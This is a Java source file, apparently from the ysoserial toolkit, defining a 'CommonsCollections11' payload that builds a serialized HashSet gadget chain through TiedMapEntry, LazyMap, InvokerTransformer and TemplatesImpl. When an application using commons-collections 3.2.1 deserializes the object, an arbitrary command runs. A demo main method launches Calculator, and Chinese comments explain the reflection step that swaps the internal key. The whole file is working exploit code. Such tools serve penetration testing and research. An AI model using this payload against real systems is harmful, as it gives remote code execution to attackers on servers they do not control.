package ysoserial.payloads;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

/*
java.security.manager off OR set jdk.xml.enableTemplatesImplDeserialization=true
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                ... templates gadgets ...
                                    java.lang.Runtime.exec()
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-collections:commons-collections:3.2.1"})
public class CommonsCollections11 extends PayloadRunner implements ObjectPayload<HashSet>  {

    public HashSet getObject(final String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);

        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map,templates);

        HashSet hashset = new HashSet(1);
        hashset.add("foo");
        // 我们要设置 HashSet 的 map 为我们的 HashMap
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap hashset_map = (HashMap) f.get(hashset);
        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[])f2.get(hashset_map);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        Reflections.setAccessible(keyField);
        // 设置 key 为我们的 tiedmap
        keyField.set(node,tiedmap);
        Reflections.setFieldValue(transformer,"iMethodName","newTransformer");
        return hashset;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections11.class, new String[]{"open -a Calculator"});
    }
}
